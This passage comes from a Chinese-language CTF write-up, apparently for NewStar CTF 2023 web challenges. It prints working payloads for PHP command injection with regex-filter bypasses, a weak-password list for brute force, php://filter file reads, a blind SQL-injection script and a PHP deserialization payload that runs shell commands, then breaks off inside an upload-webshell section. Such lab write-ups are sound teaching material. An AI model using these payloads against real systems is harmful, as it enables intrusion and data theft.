number\">9999999</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">if</span> md5<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'c4d038'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到结果 ：&quot;114514&quot;。</p>\n<p>然后就是要求传入一个 e_v.a.l 参数，来命令执行，如果直接以这种形式传入，由于 php 中的变量只能是数字字母下划线，而 php8 以下会自动把一些不合法的字符转换成下划线，所以会被自动替换为 e_v_a_l。</p>\n<p>但是没有关系，他有个 bug，就是如果我们让你一个下划线的位置为 '['，那么后面的点是不会转换的，因此可以传入 e [v.a.l</p>\n<p>最后一个考点就是绕过正则匹配，以下方法均可使用。</p>\n<blockquote>\n<p>password=114514&amp;e[v.a.l=echo `l\\s /`;</p>\n<p>password=114514&amp;e[v.a.l=echo `c\\at fl*`;</p>\n</blockquote>\n<blockquote>\n<p>password=114514&amp;e[v.a.l=`ls / &gt; 1.txt`;</p>\n<p>password=114514&amp;e[v.a.l=`tac fl* &gt; 1.txt`;</p>\n</blockquote>\n<p>这两种本质上来说是一样的，当然也可用 tee 命令来代替 &gt; 符号。</p>\n<blockquote>\n<p>password=114514&amp;e[v.a.l=var_dump(scandir('/'));</p>\n<p>password=114514&amp;e[v.a.l=var_dump(file_get_contents($_POST['a']));&amp;a=/flag</p>\n</blockquote>\n<h3 id=\"easylogin\"><a class=\"anchor\" href=\"#easylogin\">#</a> EasyLogin</h3>\n<p>进入之后是一个登录界面，先随便注册一个账号登进去看看。</p>\n<p><code>Ctrl``C</code>  和 <code>Ctrl``D</code>  回到 Shell，简单看了下目录结构没有什么东西，只告知了含有一个 admin 用户，按方向上键可以查询 Bash 历史记录。</p>\n<p>发现 Hint，得知 admin 的密码为弱密码加上 <code>newstarnewstar2023</code>  后其中的一个。</p>\n<p>按 <code>CtrlD</code>  或者输入 <code>exit</code>  后回车回到登录界面。</p>\n<p>那就简单爆破一下，最终爆破出 000000（不同靶机弱密码不同）</p>\n<p>题目采用的弱密码表</p>\n<blockquote>\n<p>123456789</p>\n<p>password</p>\n<p>newstar</p>\n<p>newstar2023</p>\n<p>123qwe</p>\n<p>qwe123</p>\n<p>qwertyuiop</p>\n<p>asdfghjkl</p>\n<p>zxcvbnm</p>\n<p>admin123</p>\n<p>admin888</p>\n<p>111111</p>\n<p>000000</p>\n</blockquote>\n<p>查询历史记录只提示了使用 <code>BurpSuite</code> ，尝试抓包。</p>\n<p>使用 <code>BurpSuite</code>  拦截、开启代理，重新完成一次登录，发现一个 <code>/passport</code>  的 302 跳转，查看它的响应获取 flag.</p>\n<h2 id=\"week2\"><a class=\"anchor\" href=\"#week2\">#</a> Week2</h2>\n<h3 id=\"游戏高手\"><a class=\"anchor\" href=\"#游戏高手\">#</a> 游戏高手</h3>\n<p>js 审计题，和 SHCTF 那道飞机大战差不多。</p>\n<p>题目说 100,000 分就给 Flag，查看一下源代码：</p>\n<p>在 app_v2.js 中看到这样一串代码：</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">gameover</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>gameScore <span class=\"token operator\">></span> <span class=\"token number\">100000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">var</span> xhr <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">XMLHttpRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        xhr<span class=\"token punctuation\">.</span><span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"/api.php\"</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        xhr<span class=\"token punctuation\">.</span><span class=\"token function\">setRequestHeader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"application/json\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        xhr<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onreadystatechange</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>xhr<span class=\"token punctuation\">.</span>readyState <span class=\"token operator\">===</span> <span class=\"token number\">4</span> <span class=\"token operator\">&amp;&amp;</span> xhr<span class=\"token punctuation\">.</span>status <span class=\"token operator\">===</span> <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">var</span> response <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>xhr<span class=\"token punctuation\">.</span>responseText<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">var</span> data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token literal-property property\">score</span><span class=\"token operator\">:</span> gameScore<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        xhr<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t<span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"成绩：\"</span><span class=\"token operator\">+</span>gameScore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\tgameScore<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\tcurPhase <span class=\"token operator\">=</span><span class=\"token constant\">PHASE_READY</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\thero <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\thero <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Hero</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \t    </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以看到当分数大于 10w 分时，会向 /api.php 发送一个 json 数据包，json 内容如下：</p>\n<p score:gamescore=\"\"></p>\n<p>大体意思就是这样，向 /api.php 发送一个 post 请求，要求 gamescore&gt;100000 即可。</p>\n<p>细细分析这串代码是这样子的：</p>\n<p>利用：var xhr = new XMLHttpRequest ();  创建一个 XMLHttpRequest 对象（ <code>xhr</code> ）用于向服务器发送 HTTP 请求。</p>\n<p>使用 POST 方法将请求发送到 &quot;/api.php&quot; 的 URL。</p>\n<p>设置请求头的 Content-Type 为 &quot;application/json&quot;，表示请求的数据将以 JSON 格式发送。</p>\n<p>设置 <code>xhr</code>  对象的 <code>onreadystatechange</code>  事件处理程序，以便在请求状态改变时执行特定的操作。</p>\n<p>创建一个包含游戏分数的 JavaScript 对象（ <code>data</code> ），然后将其转换为 JSON 格式并通过 <code>xhr.send</code>  方法发送给服务器。</p>\n<p>然后，无论游戏分数是否大于 100,000，都会执行以下操作：</p>\n<ul>\n<li>弹出一个包含游戏分数的警告框，显示游戏得分（ <code>gameScore</code> ）。</li>\n<li>将 <code>gameScore</code>  重置为 0，为了准备下一轮游戏。</li>\n<li>重置 <code>curPhase</code>  为 <code>PHASE_READY</code> ，将游戏状态设置为准备状态。</li>\n<li>创建一个新的 <code>hero</code>  对象</li>\n</ul>\n<p>关于 xhr.readyState 是这样的：</p>\n<figure class=\"highlight plaintext\"><figcaption data-lang=\"plaintext\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>xhr.readyState 是 XMLHttpRequest 对象的属性，用于表示当前请求的状态。它的值会在不同阶段的请求过程中发生变化，帮助开发人员监控和处理请求的进度。xhr.readyState 可能的取值如下：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>0（UNSENT）：初始化状态。XMLHttpRequest 对象已经创建，但尚未调用 open 方法。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>1（OPENED）：打开状态。open 方法已经被调用，但尚未调用 send 方法。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>2（HEADERS_RECEIVED）：接收响应头状态。send 方法已经被调用，响应头已经接收。</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>3（LOADING）：正在接收响应数据。正在接收响应数据，但尚未完成。</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>4（DONE）：完成状态。整个请求过程已完成，包括接收和处理响应数据。</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>通常，在处理 XMLHttpRequest 时，开发人员会关注 xhr.readyState 的值，特别是当它变为 4 时，表示请求已经完成，可以安全地处理响应数据。这通常与 xhr.status 结合使用，以确定请求是否成功完成。</pre></td></tr></table></figure><p>关于 <code>JSON.stringify(data)</code></p>\n<blockquote>\n<p>它是 JavaScript 中的一个函数，用于将一个 JavaScript 对象或值转换为 JSON 格式的字符串。JSON（JavaScript Object Notation）是一种用于数据交换的轻量级文本格式，通常用于在不同应用程序之间传递数据。</p>\n<p>当你传递一个 JavaScript 对象给  <code>JSON.stringify()</code>  函数时，它会将该对象序列化为一个 JSON 字符串，以便可以在网络中传输、存储到文件中，或者用于其他数据交换的场合。这个函数的语法如下：</p>\n<pre><code>javascriptCopy code\nJSON.stringify(value[, replacer[, space]])\n</code></pre>\n<ul>\n<li><code>value</code> : 要转换为 JSON 字符串的值（通常是一个 JavaScript 对象）。</li>\n<li><code>replacer</code> （可选）：一个函数或数组，用于控制如何筛选或转换对象的属性。如果不需要筛选或转换属性，可以将其设置为  <code>null</code> 。</li>\n<li><code>space</code> （可选）：一个用于缩进输出的字符串或数字，可选项，用于美化生成的 JSON 字符串。通常用于格式化输出。</li>\n</ul>\n</blockquote>\n<p>理解了代码后，发包：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/api.php</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">b76621da-9478-4b38-816d-21bfa26d009a.node4.buuoj.cn:81</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/json</span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token application-json\"></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#123;</span><span class=\"token string-property property\">\"score\"</span> <span class=\"token operator\">:</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><p>得到响应包：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token response-status\"><span class=\"token http-version property\">HTTP/1.1</span> <span class=\"token status-code number\">200</span> <span class=\"token reason-phrase string\">OK</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Server</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">openresty</span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Date</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Tue, 07 Nov 2023 12:27:40 GMT</span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html; charset=utf-8</span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">X-Powered-By</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">PHP/7.3.15</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">58</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>&#123;\"message\":\"flag&#123;f7aa0a86-95fb-469e-9fba-a3c309b69e16&#125;\\n\"&#125;</pre></td></tr></table></figure><p>或者可以设置断点，来修改 score。</p>\n<h3 id=\"include-0-0\"><a class=\"anchor\" href=\"#include-0-0\">#</a> include 0。0</h3>\n<p>进入题目给出源码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// FLAG in the flag.php</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/base|rot/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    @<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></span> nope</pre></td></tr></table></figure><p>需要读取 flag.php 文件，读取 php 文件需要使用 php://filter 伪协议中的过滤器，常见的就是 base64 编码，但这里过滤了 base 和 rot</p>\n<p>但是没有关系，可以用其他过滤器，比如 convert.iconv 系列过滤器。</p>\n<p>具体可以参考这篇文章：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5L2FydGljbGUvZGV0YWlscy8xMDkzMDAzMzU=\">php://filter 的各种过滤器</span></p>\n<p>payload:</p>\n<blockquote>\n<p>?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=flag.php</p>\n</blockquote>\n<h3 id=\"ez_sql\"><a class=\"anchor\" href=\"#ez_sql\">#</a> ez_sql</h3>\n<p>union 注入题，使用大小写就可以绕过，为了之后方便，我直接写了一个盲注脚本：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> urllib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>session <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>burp0_url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://4eee49a9-7a7b-4891-933b-27c782f49044.node4.buuoj.cn:81/\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> string<span class=\"token punctuation\">.</span>printable<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">#url = burp0_url + \"?id=TMP1589' And Ascii(Substr(database(),&#123;&#125;,1)) = &#123;&#125;%23\".format(i, ord(j))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#url = burp0_url + \"?id=TMP1589' And Ascii(Substr((Select table_name From INFOrmation_schema.tables Where table_schema='ctf' limit 1,1),&#123;&#125;,1))=&#123;&#125;%23\".format(i, ord(j))</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#here_is_flag</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#url = burp0_url + \"?id=TMP1589' And Ascii(Substr((Select column_name From INFOrmation_schema.columns Where table_schema='ctf' And table_name='here_is_flag' limit 0,1),&#123;&#125;,1))=&#123;&#125;%23\".format(i, ord(j))</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        url <span class=\"token operator\">=</span> burp0_url <span class=\"token operator\">+</span> <span class=\"token string\">\"?id=TMP1589' And Ascii(Substr((Select flag From here_is_flag),&#123;&#125;,1))=&#123;&#125;%23\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        r <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"id: TMP1589\"</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            flag <span class=\"token operator\">+=</span> j</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr></table></figure><h3 id=\"unserialize\"><a class=\"anchor\" href=\"#unserialize\">#</a> Unserialize？</h3>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// Maybe you need learn some knowledge about deserialize?</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">evil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/cat|tac|more|tail|base/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            @<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>@<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'unser'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>简单的反序列化题，对 rce 的过滤也很简单，</p>\n<p>使用 '\\'、单引号绕过，或者用其他文件查看命令即可。</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">evil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"c\\at /th1s_1s_fffflllll4444aaaggggg\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">evil</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></pre></td></tr></table></figure><blockquote>\n<p>unser=O%3A4%3A%22evil%22%3A1%3A%7Bs%3A9%3A%22%00evil%00cmd%22%3Bs%3A35%3A%22c%5Cat+%2Fth1s_1s_fffflllll4444aaaggggg%22%3B%7D</p>\n</blockquote>\n<h3 id=\"upload-again\"><a class=\"anchor\" href=\"#upload-again\">#</a> Upload again!</h3>\n<p>本题的考点是绕过后端对后缀名的限制，apache 解析漏洞，绕过对文件内容的检测。</p>\n<p>文件内容禁止使用 &lt;?，用下面的一句话木马绕过：</p>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/</span> <span class=\"token http-version property\">HTTP/1.1</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token header\"><span 